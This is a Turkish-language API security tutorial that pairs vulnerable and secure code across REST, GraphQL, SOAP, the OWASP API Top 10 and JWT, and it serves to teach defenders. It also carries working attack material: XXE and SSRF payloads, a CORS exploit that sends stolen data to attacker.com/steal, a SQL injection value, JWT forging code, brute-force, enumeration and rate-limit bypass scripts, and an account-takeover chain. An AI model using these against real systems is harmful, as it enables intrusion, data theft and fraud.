# 🔐 API Security: Sıfırdan Profesyonele Kapsamlı Rehber

> **"API'ler modern uygulamaların sinir sistemidir. Onları korumak, tüm sistemi korumaktır."** - API Security Manifestosu

---

## 📋 İçindekiler

- [Level 0: API'lere Giriş ve Felsefe](#level-0-apilere-giriş-ve-felsefe)
- [Level 1: Temel API Konseptleri](#level-1-temel-api-konseptleri)
- [Level 2: API Mimarileri](#level-2-api-mimarileri)
  - [REST API](#rest-api)
  - [GraphQL](#graphql)
  - [SOAP](#soap)
- [Level 3: OWASP API Security Top 10](#level-3-owasp-api-security-top-10)
- [Level 4: JWT Güvenliği](#level-4-jwt-güvenliği)
- [Level 5: API Test Araçları ve Metodoloji](#level-5-api-test-araçları-ve-metodoloji)
- [Level 6: İleri Seviye API Saldırıları](#level-6-i̇leri-seviye-api-saldırıları)
- [Level 7: API Güvenlik Best Practices](#level-7-api-güvenlik-best-practices)

---

## Level 0: API'lere Giriş ve Felsefe

### 🤔 API Nedir?

**API (Application Programming Interface)**, farklı yazılım bileşenlerinin birbirleriyle iletişim kurmasını sağlayan bir ara yüzdür.

**Gerçek Dünya Analojisi:**
Bir restoran düşünün:
- **Mutfak** = Backend (veri ve işlemler)
- **Garson** = API (arayüz)
- **Müşteri** = Frontend (kullanıcı)

Müşteri doğrudan mutfağa girmez. Garson (API) aracılığıyla sipariş verir, garson bu siparişi mutfağa iletir, yemek hazırlanır ve tekrar garson aracılığıyla müşteriye ulaştırılır.

### 📊 Neden API Güvenliği Kritik?

**İstatistikler:**
```
📈 2023'te API saldırıları %400 arttı
🎯 Veri ihlallerinin %83'ü API'ler üzerinden gerçekleşti
💰 Ortalama API güvenlik ihlali maliyeti: $4.24 milyon
```

**Yaygın API Güvenlik Olayları:**
- **Facebook (2019):** 533 milyon kullanıcı verisi sızdı
- **T-Mobile (2021):** 40 milyon müşteri verisi çalındı
- **Peloton (2021):** 3.6 milyon kullanıcının private profilleri ifşa oldu

### 🎯 Bu Rehber Size Ne Öğretecek?

1. ✅ REST, GraphQL ve SOAP API'lerinin nasıl çalıştığı
2. ✅ OWASP API Security Top 10 zaafiyetleri
3. ✅ JWT token'ların manipülasyonu ve güvenliği
4. ✅ Burp Suite ve Postman ile profesyonel API testi
5. ✅ API Rate Limiting bypass ve advanced exploitation

---

## Level 1: Temel API Konseptleri

### 🔤 Temel Terminoloji

#### **Endpoint**
API'nin erişilebilir bir noktası.
```
https://api.example.com/users/123
                       └──────┬──────┘
                           Endpoint
```

#### **Request & Response**
- **Request:** İstemcinin API'ye gönderdiği mesaj
- **Response:** API'nin istemciye geri gönderdiği cevap

#### **HTTP Methods**
```
GET     → Veri okuma
POST    → Yeni veri oluşturma
PUT     → Var olan veriyi güncelleme (tamamı)
PATCH   → Var olan veriyi güncelleme (kısmi)
DELETE  → Veri silme
```

#### **Status Codes**
```
200 OK              → Başarılı
201 Created         → Kayıt oluşturuldu
400 Bad Request     → Geçersiz istek
401 Unauthorized    → Kimlik doğrulama gerekli
403 Forbidden       → Erişim reddedildi
404 Not Found       → Kaynak bulunamadı
500 Internal Error  → Sunucu hatası
```

### 🔑 Authentication vs Authorization

#### **Authentication (Kimlik Doğrulama)**
"Sen kimsin?"
```
Yöntemler:
- Basic Auth (Username:Password)
- API Keys
- OAuth 2.0
- JWT (JSON Web Token)
```

#### **Authorization (Yetkilendirme)**
"Ne yapma hakkın var?"
```
Modeller:
- RBAC (Role-Based Access Control)
- ABAC (Attribute-Based Access Control)
- ACL (Access Control Lists)
```

### 📡 API İstek Yapısı

**Örnek GET İsteği:**
```http
GET /api/users/123 HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGc...
Accept: application/json
User-Agent: MyApp/1.0
```

**Örnek POST İsteği:**
```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGc...

{
  "username": "john_doe",
  "email": "john@example.com",
  "role": "user"
}
```

---

## Level 2: API Mimarileri

### REST API

#### 🎯 REST Nedir?

**REST (Representational State Transfer)**, HTTP protokolü üzerine inşa edilmiş mimari bir stildir.

**REST Prensipleri:**
1. **Stateless:** Her istek bağımsızdır, sunucu oturum bilgisi saklamaz
2. **Client-Server:** İstemci ve sunucu ayrı
3. **Cacheable:** Yanıtlar cache'lenebilir
4. **Uniform Interface:** Tutarlı arayüz
5. **Layered System:** Katmanlı mimari

#### 📊 REST API Endpoint Örnekleri

```
Kullanıcı Yönetimi:
GET    /api/users          → Tüm kullanıcıları listele
GET    /api/users/123      → ID=123 kullanıcıyı getir
POST   /api/users          → Yeni kullanıcı oluştur
PUT    /api/users/123      → ID=123 kullanıcıyı güncelle (tüm alanlar)
PATCH  /api/users/123      → ID=123 kullanıcıyı güncelle (kısmi)
DELETE /api/users/123      → ID=123 kullanıcıyı sil
```

#### 🔍 REST API Zaafiyetleri

**1. BOLA (Broken Object Level Authorization)**

**Zafiyet:**
```bash
# Normal kullanıcı kendi kaydını görür
GET /api/orders/1234
Authorization: Bearer user_token

# BOLA: Başka kullanıcının kaydını görür
GET /api/orders/1235
Authorization: Bearer user_token
```

**Zafiyet Barındıran Kod (Node.js):**
```javascript
// ❌ GÜVENSİZ - Authorization kontrolü yok!
app.get('/api/orders/:id', authenticateToken, (req, res) => {
    const orderId = req.params.id;
    
    db.query('SELECT * FROM orders WHERE id = ?', [orderId], (err, result) => {
        res.json(result[0]);
    });
});
```

**2. Mass Assignment**

**Zafiyet:**
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "role": "admin",        // ❌ İstemci admin rolü atayabiliyor!
  "is_verified": true     // ❌ İstemci hesabını doğrulamış yapıyor!
}
```

**Zafiyet Barındıran Kod:**
```javascript
// ❌ GÜVENSİZ - Tüm alanlar direkt alınıyor
app.post('/api/users', (req, res) => {
    const userData = req.body;  // İstemciden gelen TÜM data
    db.insert('users', userData);  // Filtreleme yok!
});
```

---

### GraphQL

#### 🎯 GraphQL Nedir?

**GraphQL**, Facebook tarafından geliştirilen, istemcinin ihtiyacı olan veriyi tam olarak talep etmesini sağlayan bir query dilidir.

**REST vs GraphQL:**
```
REST:
GET /api/users/123          → Tüm kullanıcı bilgisi gelir
GET /api/users/123/posts    → Kullanıcının postları
GET /api/posts/456/comments → Post yorumları

GraphQL (Tek İstek):
{
  user(id: 123) {
    name
    email
    posts {
      title
      comments {
        text
        author
      }
    }
  }
}
```

#### 📊 GraphQL Sorgu Yapısı

**Query (Veri Okuma):**
```graphql
query {
  user(id: "123") {
    id
    name
    email
    posts {
      title
      content
    }
  }
}
```

**Mutation (Veri Değiştirme):**
```graphql
mutation {
  createPost(
    title: "New Post"
    content: "Content here"
  ) {
    id
    title
    createdAt
  }
}
```

**Subscription (Gerçek Zamanlı):**
```graphql
subscription {
  newMessage {
    id
    text
    sender
  }
}
```

#### 🔍 GraphQL Zaafiyetleri

**1. Introspection Information Disclosure**

**Zafiyet:**
GraphQL introspection varsayılan olarak açıktır ve tüm şemayı ifşa eder.

```graphql
# Tüm şemayı öğrenme
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

**Sonuç:**
```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "User",
          "fields": [
            {"name": "id", "type": {"name": "ID"}},
            {"name": "username", "type": {"name": "String"}},
            {"name": "email", "type": {"name": "String"}},
            {"name": "password", "type": {"name": "String"}},  // ❌ Hassas alan
            {"name": "credit_card", "type": {"name": "String"}} // ❌ Hassas alan
          ]
        }
      ]
    }
  }
}
```

**2. Denial of Service (DoS)**

**Zafiyet - Deep Nested Queries:**
```graphql
{
  user(id: "1") {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  # ... 100 seviye daha
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Zafiyet - Circular Queries:**
```graphql
{
  posts {
    author {
      posts {
        author {
          posts {
            # Sonsuz döngü!
          }
        }
      }
    }
  }
}
```

**3. Batch Attack**

**Zafiyet:**
```graphql
# Tek istekte 1000 sorgu çalıştırma
mutation {
  login1: login(username: "admin", password: "pass1") { token }
  login2: login(username: "admin", password: "pass2") { token }
  login3: login(username: "admin", password: "pass3") { token }
  # ... 1000 kez
  login1000: login(username: "admin", password: "pass1000") { token }
}
```

---

### SOAP

#### 🎯 SOAP Nedir?

**SOAP (Simple Object Access Protocol)**, XML tabanlı bir mesajlaşma protokolüdür.

**SOAP İstek Örneği:**
```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Header>
    <auth:Authentication xmlns:auth="http://example.com/auth">
      <auth:Username>admin</auth:Username>
      <auth:Password>password123</auth:Password>
    </auth:Authentication>
  </soap:Header>
  <soap:Body>
    <m:GetUserInfo xmlns:m="http://example.com/users">
      <m:UserId>123</m:UserId>
    </m:GetUserInfo>
  </soap:Body>
</soap:Envelope>
```

#### 🔍 SOAP Zaafiyetleri

**1. XML External Entity (XXE)**

**Zafiyet:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <Username>&xxe;</Username>  <!-- /etc/passwd içeriği döner! -->
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

**2. SOAP Injection**

**Zafiyet:**
```xml
<!-- Normal istek -->
<soap:Body>
  <GetUser>
    <Username>john</Username>
  </GetUser>
</soap:Body>

<!-- Injection -->
<soap:Body>
  <GetUser>
    <Username>john</Username>
  </GetUser>
  <GetUser>
    <Username>admin</Username>  <!-- İkinci bir sorgu enjekte edildi! -->
  </GetUser>
</soap:Body>
```

---

## Level 3: OWASP API Security Top 10

### A01: Broken Object Level Authorization (BOLA/IDOR)

#### 🎯 Açıklama
API, kullanıcının erişmeye yetkili olmadığı nesnelere (kaynaklara) erişmesini engelleyemez.

#### 🔍 Gerçek Dünya Örneği

**Senaryо:**
```
Kullanıcı A'nın User ID: 100
Kullanıcı B'nin User ID: 101

Kullanıcı A şu isteği yapar:
GET /api/profile/101
```

**Zafiyet Barındıran Kod:**
```python
@app.route('/api/profile/<user_id>')
@login_required  # Sadece authentication var, authorization yok!
def get_profile(user_id):
    user = db.query("SELECT * FROM users WHERE id=?", user_id)
    return jsonify(user)
```

#### 🛠️ Test Metodolojisi

**1. Parametre Keşfi:**
```bash
# Burp Suite ile API isteklerini yakala
# ID, user_id, account_id, order_id gibi parametreleri tespit et
```

**2. Değer Değiştirme:**
```python
import requests

# Kendi token'ımız
headers = {"Authorization": "Bearer your_token_here"}

# Başka kullanıcı ID'leri deneme
for user_id in range(1, 1000):
    response = requests.get(
        f"https://api.example.com/profile/{user_id}",
        headers=headers
    )
    if response.status_code == 200:
        print(f"[+] Erişilebilir: User {user_id}")
        print(response.json())
```

#### ✅ Güvenli Kod

```python
@app.route('/api/profile/<user_id>')
@login_required
def get_profile(user_id):
    current_user_id = get_jwt_identity()  # Token'dan kullanıcı ID'si
    
    # Authorization kontrolü
    if str(current_user_id) != str(user_id):
        return jsonify({"error": "Forbidden"}), 403
    
    user = db.query("SELECT * FROM users WHERE id=?", user_id)
    return jsonify(user)
```

---

### A02: Broken Authentication

#### 🎯 Açıklama
Kimlik doğrulama mekanizmalarındaki hatalar.

#### 🔍 Yaygın Zaafiyetler

**1. Zayıf Token Oluşturma**

**❌ Tahmin Edilebilir Token:**
```python
# GÜVENSİZ - Sequential token
token = f"user_{user_id}_{timestamp}"
# Örnek: user_123_1234567890
```

**2. Token Expiration Yok**

```python
# ❌ Token süresi dolmuyor
token = jwt.encode(
    {"user_id": user_id},
    secret_key,
    algorithm="HS256"
    # exp parametresi yok!
)
```

**3. Brute Force Koruması Yok**

**Saldırı:**
```python
import requests

passwords = open('rockyou.txt', 'r').readlines()

for password in passwords:
    response = requests.post(
        'https://api.example.com/login',
        json={"username": "admin", "password": password.strip()}
    )
    
    if response.status_code == 200:
        print(f"[+] Şifre bulundu: {password}")
        break
```

#### ✅ Güvenli Uygulamalar

**Token Expiration:**
```python
from datetime import datetime, timedelta

token = jwt.encode(
    {
        "user_id": user_id,
        "exp": datetime.utcnow() + timedelta(hours=1)  # 1 saat geçerli
    },
    secret_key,
    algorithm="HS256"
)
```

**Rate Limiting:**
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")  # Dakikada 5 deneme
def login():
    # Login logic
    pass
```

---

### A03: Broken Object Property Level Authorization

#### 🎯 Açıklama
API, kullanıcının değiştiremeyeceği property'leri değiştirmesine izin verir.

#### 🔍 Mass Assignment Zafiyeti

**Zafiyet Senaryosu:**

**API Endpoint:**
```javascript
// ❌ GÜVENSİZ
app.patch('/api/users/:id', (req, res) => {
    const userId = req.params.id;
    const updateData = req.body;  // Tüm data alınıyor!
    
    db.update('users', userId, updateData);
});
```

**Saldırı:**
```http
PATCH /api/users/123 HTTP/1.1
Authorization: Bearer user_token
Content-Type: application/json

{
  "email": "newemail@example.com",
  "role": "admin",              // ❌ Rolünü admin yapıyor!
  "is_verified": true,          // ❌ Hesabını doğrulamış yapıyor!
  "account_balance": 999999     // ❌ Bakiyesini artırıyor!
}
```

#### ✅ Güvenli Kod

```javascript
app.patch('/api/users/:id', authenticateToken, (req, res) => {
    const userId = req.params.id;
    
    // Whitelist: Sadece izin verilen alanlar
    const allowedFields = ['email', 'name', 'phone'];
    const updateData = {};
    
    allowedFields.forEach(field => {
        if (req.body[field] !== undefined) {
            updateData[field] = req.body[field];
        }
    });
    
    // Authorization kontrolü
    if (req.user.id !== userId) {
        return res.status(403).json({error: "Forbidden"});
    }
    
    db.update('users', userId, updateData);
});
```

---

### A04: Unrestricted Resource Consumption

#### 🎯 Açıklama
API, aşırı kaynak tüketimi yapılmasına izin verir (Rate Limiting, pagination, filtering eksikliği).

#### 🔍 Zaafiyetler

**1. Rate Limiting Yok**

**Saldırı - API Flooding:**
```bash
# Apache Bench ile 10000 istek gönderme
ab -n 10000 -c 100 https://api.example.com/expensive-operation

# Slowloris DoS
slowloris.py https://api.example.com
```

**2. Pagination Yok**

**Zafiyet:**
```http
GET /api/users HTTP/1.1

# Tüm kullanıcılar döner (1 milyon kayıt!)
```

**3. Expensive Operations**

**Zafiyet:**
```graphql
# PDF oluşturma endpoint'i
POST /api/generate-report HTTP/1.1
{
  "report_type": "full",
  "date_range": "2020-01-01 to 2024-12-31",  // 4 yıllık data!
  "include_attachments": true
}
```

#### ✅ Savunma

**Rate Limiting (Express.js):**
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 dakika
    max: 100,                   // Maksimum 100 istek
    message: 'Too many requests from this IP'
});

app.use('/api/', limiter);
```

**Pagination:**
```javascript
app.get('/api/users', (req, res) => {
    const page = parseInt(req.query.page) || 1;
    const limit = Math.min(parseInt(req.query.limit) || 10, 100);  // Max 100
    const offset = (page - 1) * limit;
    
    db.query(
        'SELECT * FROM users LIMIT ? OFFSET ?',
        [limit, offset],
        (err, results) => res.json(results)
    );
});
```

---

### A05: Broken Function Level Authorization

#### 🎯 Açıklama
API, kullanıcının yetkisi olmadığı fonksiyonları çalıştırmasına izin verir.

#### 🔍 Zafiyet Örneği

**Admin Endpoint'i:**
```javascript
// ❌ GÜVENSİZ - Sadece URL'i bilmek yeterli
app.delete('/api/admin/users/:id', authenticateToken, (req, res) => {
    // Admin kontrolü YOK!
    db.delete('users', req.params.id);
});
```

**Saldırı:**
```bash
# Normal kullanıcı token'ı ile admin endpoint'ine erişim
DELETE /api/admin/users/123 HTTP/1.1
Authorization: Bearer regular_user_token

# Başarılı! Kullanıcı silindi!
```

#### 🛠️ Keşif Teknikleri

**1. Endpoint Enumeration:**
```bash
# Wordlist ile admin endpoint'lerini bulma
ffuf -u https://api.example.com/api/FUZZ -w admin-endpoints.txt \
     -H "Authorization: Bearer user_token"
```

**2. HTTP Method Testing:**
```bash
# PUT/DELETE gibi metotları deneme
curl -X DELETE https://api.example.com/api/users/123 \
     -H "Authorization: Bearer user_token"
```

#### ✅ Güvenli Kod

```javascript
// Role-based middleware
function requireAdmin(req, res, next) {
    if (req.user.role !== 'admin') {
        return res.status(403).json({error: "Admin access required"});
    }
    next();
}

app.delete('/api/admin/users/:id', authenticateToken, requireAdmin, (req, res) => {
    db.delete('users', req.params.id);
});
```

---

### A06: Unrestricted Access to Sensitive Business Flows

#### 🎯 Açıklama
Kritik iş akışlarının otomasyonla kötüye kullanılması.

#### 🔍 Örnek Senaryolar

**1. Bilet/Ürün Scalping:**
```python
import requests
import threading

def buy_ticket():
    response = requests.post(
        'https://api.ticketmaster.com/purchase',
        json={"event_id": "123", "quantity": 10}
    )

# 100 thread ile aynı anda binlerce bilet alma
for _ in range(100):
    threading.Thread(target=buy_ticket).start()
```

**2. Referral Bonus Abuse:**
```python
# Sahte hesaplar oluşturarak referral bonus alma
for i in range(1000):
    requests.post(
        'https://api.example.com/register',
        json={
            "email": f"fake{i}@temp-mail.org",
            "referral_code": "attacker_referral_code"
        }
    )
```

#### ✅ Savunma

**CAPTCHA:**
```javascript
const axios = require('axios');

async function verifyCaptcha(token) {
    const response = await axios.post(
        'https://www.google.com/recaptcha/api/siteverify',
        {
            secret: process.env.RECAPTCHA_SECRET,
            response: token
        }
    );
    return response.data.success;
}

app.post('/api/purchase', async (req, res) => {
    if (!await verifyCaptcha(req.body.captcha_token)) {
        return res.status(400).json({error: "CAPTCHA verification failed"});
    }
    
    // Satın alma işlemi
});
```

---

### A07: Server Side Request Forgery (SSRF)

#### 🎯 Açıklama
API, kullanıcının kontrol ettiği bir URL'e istek yapar.

#### 🔍 Zafiyet Örneği

**Vulnerable Endpoint:**
```python
@app.route('/api/fetch-url', methods=['POST'])
def fetch_url():
    url = request.json.get('url')
    
    # ❌ URL doğrulaması yok!
    response = requests.get(url)
    return response.content
```

**Saldırı:**
```http
POST /api/fetch-url HTTP/1.1
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

**Sonuç - AWS Credentials:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalr...",
  "Token": "FwoGZXIvYXdz..."
}
```

#### ✅ Güvenli Kod

```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.partner.com', 'cdn.example.com']

@app.route('/api/fetch-url', methods=['POST'])
def fetch_url():
    url = request.json.get('url')
    parsed = urlparse(url)
    
    # Protocol check
    if parsed.scheme not in ['http', 'https']:
        return jsonify({"error": "Invalid protocol"}), 400
    
    # Domain whitelist
    if parsed.netloc not in ALLOWED_DOMAINS:
        return jsonify({"error": "Domain not allowed"}), 403
    
    # Private IP check
    if is_private_ip(parsed.netloc):
        return jsonify({"error": "Private IP blocked"}), 403
    
    response = requests.get(url, timeout=5)
    return response.content
```

---

### A08: Security Misconfiguration

#### 🔍 Yaygın Hatalar

**1. CORS Misconfiguration**

**❌ Tehlikeli Yapılandırma:**
```javascript
app.use(cors({
    origin: '*',  // Tüm domainlere izin!
    credentials: true  // Cookie'ler de paylaşılıyor!
}));
```

**Exploit:**
```html
<!-- attacker.com -->
<script>
fetch('https://api.victim.com/user/profile', {
    credentials: 'include'  // Victim'in cookie'leri gönderilir
})
.then(r => r.json())
.then(data => {
    // Çalınan data attacker sunucusuna gönderilir
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
```

**2. Debug Mode Açık**

```python
# ❌ Production'da debug=True
app.run(debug=True, host='0.0.0.0')
```

**Sonuç:**
```
Traceback içinde:
- Kaynak kod satırları
- Değişken değerleri
- Veritabanı sorguları
- API anahtarları
```

---

### A09: Improper Inventory Management

#### 🎯 Açıklama
Dokümante edilmemiş, eski veya beta API'lerin güvenlik açıkları.

#### 🔍 Keşif Teknikleri

**API Versiyonlarını Bulma:**
```bash
# Version enumeration
curl https://api.example.com/v1/users
curl https://api.example.com/v2/users
curl https://api.example.com/v3/users
curl https://api.example.com/beta/users
curl https://api.example.com/api/v1/users
```

**Eski API'lerde Zafiyet:**
```
/v1/users → Authentication yok (eski, unutulmuş)
/v2/users → Authentication var ama BOLA zafiyeti
/v3/users → Güvenli
```

---

### A10: Unsafe Consumption of APIs

#### 🎯 Açıklama
API'nin güvenmediği 3. parti API'lerden gelen veriye güvenmesi.

#### 🔍 Örnek

**Zafiyet:**
```javascript
// 3. parti API'den veri al
const userData = await fetch('https://thirdparty-api.com/user/123');

// ❌ Veri doğrulanmadan direkt kullanılıyor!
db.query(`INSERT INTO users VALUES ('${userData.name}', '${userData.email}')`);
```

**Saldırı:**
3. parti API compromise edilirse:
```json
{
  "name": "John'; DROP TABLE users;--",
  "email": "attacker@evil.com"
}
```

---

## Level 4: JWT Güvenliği

### 🔑 JWT Yapısı

**JWT Formatı:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6InVzZXIifQ.signature
└──────────────┬───────────────────┘ └──────────────┬──────────────┘ └────┬────┘
           Header                             Payload                  Signature
```

**Decode Edilmiş:**
```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "userId": 123,
  "role": "user",
  "exp": 1735689600
}

// Signature (secret key ile imzalanmış)
```

### 🔓 JWT Zafiyetleri

#### **1. Algorithm Confusion (alg: none)**

**Zafiyet:**
```json
// ❌ Algoritma "none" olarak değiştir
{
  "alg": "none",
  "typ": "JWT"
}
{
  "userId": 123,
  "role": "admin"  // Rolü admin yap!
}
// Signature yok
```

**Exploit:**
```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"userId": 123, "role": "admin"}

token = (
    base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=") +
    "." +
    base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") +
    "."
)

print(token)
```

#### **2. Weak Secret Key**

**Brute Force:**
```bash
# JWT Cracking
hashcat -m 16500 -a 0 jwt.txt rockyou.txt

# John the Ripper
john jwt.txt --wordlist=rockyou.txt
```

**Yaygın Zayıf Secret'lar:**
```
secret
password
123456
jwt_secret
your_secret_key_here
```

#### **3. Key Confusion (RS256 → HS256)**

**Zafiyet:**
```
RS256: Asymmetric (public/private key)
HS256: Symmetric (secret key)
```

**Saldırı:**
```python
# 1. Public key'i al (genellikle /jwks.json)
# 2. Public key'i secret olarak kullanarak HS256 JWT oluştur!

import jwt

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----"""

payload = {"userId": 123, "role": "admin"}

# Public key'i secret gibi kullan!
token = jwt.encode(payload, public_key, algorithm="HS256")
```

#### **4. JWT Expiration Bypass**

**Zafiyet:**
```python
# ❌ exp kontrolü yok
decoded = jwt.decode(token, secret, algorithms=["HS256"], options={"verify_exp": False})
```

**Exploit:**
```
1. Eski bir JWT token al
2. Token expired olsa bile kullan
3. Eğer sunucu exp kontrolü yapmıyorsa, geçerli sayılır!
```

### ✅ Güvenli JWT Kullanımı

```python
import jwt
from datetime import datetime, timedelta

# Token oluşturma
def create_token(user_id, role):
    payload = {
        "user_id": user_id,
        "role": role,
        "exp": datetime.utcnow() + timedelta(hours=1),
        "iat": datetime.utcnow(),
        "iss": "api.example.com"  # Issuer
    }
    
    token = jwt.encode(
        payload,
        app.config['JWT_SECRET_KEY'],  # Güçlü secret (32+ karakter)
        algorithm="HS256"
    )
    return token

# Token doğrulama
def verify_token(token):
    try:
        decoded = jwt.decode(
            token,
            app.config['JWT_SECRET_KEY'],
            algorithms=["HS256"],  # Sadece güvenli algoritma
            options={
                "verify_exp": True,  # Expiration kontrol et
                "verify_iat": True,  # Issued at kontrol et
                "require": ["exp", "iat", "user_id", "role"]  # Gerekli alanlar
            }
        )
        return decoded
    except jwt.ExpiredSignatureError:
        raise Exception("Token expired")
    except jwt.InvalidTokenError:
        raise Exception("Invalid token")
```

---

## Level 5: API Test Araçları ve Metodoloji

### 🔧 Burp Suite ile API Testi

#### **1. Kurulum ve Proxy Ayarları**

```bash
# Burp Suite başlat
java -jar burpsuite.jar

# Proxy: 127.0.0.1:8080

# Tarayıcı proxy ayarları
# Firefox → Settings → Network Settings → Manual proxy
# HTTP Proxy: 127.0.0.1, Port: 8080
```

#### **2. API İsteklerini Yakalama**

**Postman'dan Burp'e Göndermek:**
```
1. Postman → Settings → Proxy
2. Use system proxy: ON
3. HTTP Proxy: 127.0.0.1:8080
4. İstekleri Burp'te yakala
```

#### **3. Burp Repeater ile Manipülasyon**

**BOLA Testi:**
```
1. Proxy → HTTP history → İstek yakala
2. Sağ tık → Send to Repeater
3. Repeater'da user_id parametresini değiştir:
   /api/users/123 → /api/users/124
4. Send → Başka kullanıcının datası geliyorsa BOLA var!
```

#### **4. Burp Intruder ile Brute Force**

**Token Cracking:**
```
1. İsteği Intruder'a gönder
2. Payload Positions:
   Authorization: Bearer §TOKEN§
3. Payloads:
   - Load wordlist (rockyou.txt)
   - Payload processing: Base64 decode
4. Start attack
5. Response'larda 200 OK ara
```

#### **5. Burp Extensions**

**JSON Web Tokens:**
```
Extender → BApp Store → "JSON Web Tokens" yükle

Kullanım:
1. JWT token yakala
2. Inspector → JWT tab
3. Header/Payload edit et
4. Algoritma değiştir (none, HS256 vb.)
5. Manipüle edilmiş tokeni kullan
```

### 📮 Postman ile API Testi

#### **1. Collection Oluşturma**

```javascript
// Pre-request Script (her istek öncesi çalışır)
pm.environment.set("timestamp", new Date().getTime());

// Login ve token alma
pm.sendRequest({
    url: 'https://api.example.com/login',
    method: 'POST',
    header: 'Content-Type: application/json',
    body: {
        mode: 'raw',
        raw: JSON.stringify({
            username: 'test',
            password: 'test123'
        })
    }
}, function (err, response) {
    const token = response.json().token;
    pm.environment.set("auth_token", token);
});
```

#### **2. Automated Testing**

**Collection Runner:**
```javascript
// Test Scripts
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

pm.test("Response time < 500ms", function () {
    pm.expect(pm.response.responseTime).to.be.below(500);
});

pm.test("BOLA Test - Forbidden", function () {
    pm.expect(pm.response.code).to.be.oneOf([403, 404]);
});

pm.test("No sensitive data in response", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData).to.not.have.property('password');
    pm.expect(jsonData).to.not.have.property('credit_card');
});
```

### 🐍 Python ile Özel Exploit Script'leri

**BOLA Scanner:**
```python
import requests
import sys

def scan_bola(base_url, endpoint, token, id_range):
    headers = {"Authorization": f"Bearer {token}"}
    
    vulnerable = []
    
    for user_id in range(id_range[0], id_range[1]):
        url = f"{base_url}{endpoint.replace('{id}', str(user_id))}"
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] Accessible: {url}")
                vulnerable.append(user_id)
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {e}")
    
    return vulnerable

if __name__ == "__main__":
    base_url = "https://api.example.com"
    endpoint = "/api/users/{id}"
    token = "your_token_here"
    id_range = (1, 1000)
    
    print("[*] Starting BOLA scan...")
    results = scan_bola(base_url, endpoint, token, id_range)
    
    print(f"\n[+] Found {len(results)} vulnerable endpoints")
    print(f"[+] Vulnerable IDs: {results}")
```

**GraphQL Introspection:**
```python
import requests
import json

def graphql_introspection(url):
    query = """
    {
      __schema {
        types {
          name
          kind
          fields {
            name
            type {
              name
              kind
            }
          }
        }
      }
    }
    """
    
    response = requests.post(url, json={"query": query})
    schema = response.json()
    
    print("[+] GraphQL Schema:")
    for type_info in schema['data']['__schema']['types']:
        if not type_info['name'].startswith('__'):
            print(f"\nType: {type_info['name']}")
            if type_info.get('fields'):
                for field in type_info['fields']:
                    print(f"  - {field['name']}: {field['type']['name']}")

graphql_introspection("https://api.example.com/graphql")
```

---

## Level 6: İleri Seviye API Saldırıları

### 🚀 Rate Limit Bypass

**1. IP Rotation:**
```python
import requests

proxies_list = [
    "http://proxy1.com:8080",
    "http://proxy2.com:8080",
    # ...
]

for i, proxy in enumerate(proxies_list):
    response = requests.post(
        "https://api.example.com/login",
        json={"username": "admin", "password": f"pass{i}"},
        proxies={"http": proxy, "https": proxy}
    )
```

**2. Header Manipulation:**
```python
# X-Forwarded-For header ile bypass
headers = {
    "X-Forwarded-For": f"192.168.1.{i}",
    "X-Real-IP": f"10.0.0.{i}",
    "X-Originating-IP": f"172.16.0.{i}"
}

requests.post(url, headers=headers, json=data)
```

### 🔗 Chaining Vulnerabilities

**Senaryo: BOLA + Mass Assignment → Account Takeover**

```python
# 1. BOLA ile başka kullanıcının ID'sini bul
victim_id = find_bola_vulnerability()

# 2. Mass Assignment ile victim'in email'ini değiştir
requests.patch(
    f"https://api.example.com/users/{victim_id}",
    headers={"Authorization": f"Bearer {attacker_token}"},
    json={"email": "attacker@evil.com"}
)

# 3. Password reset talep et
requests.post(
    "https://api.example.com/password-reset",
    json={"user_id": victim_id}
)

# 4. Attacker'ın mailine reset linki gelir
# 5. Account takeover tamamlandı!
```

---

## Level 7: API Güvenlik Best Practices

### ✅ Checklist

#### **Authentication & Authorization**
```
☑ JWT expiration süreleri uygun (15-60 dk)
☑ Refresh token mekanizması var
☑ Strong secret keys (32+ karakter)
☑ Algoritma whitelist (sadece HS256 veya RS256)
☑ Her endpoint'te authorization kontrolü
☑ RBAC/ABAC doğru implement edilmiş
```

#### **Input Validation**
```
☑ Tüm input'lar validate ediliyor
☑ Type checking yapılıyor
☑ SQL Injection koruması (prepared statements)
☑ XSS koruması (output encoding)
☑ SSRF koruması (URL whitelist)
☑ File upload validation (extension, size, mime type)
```

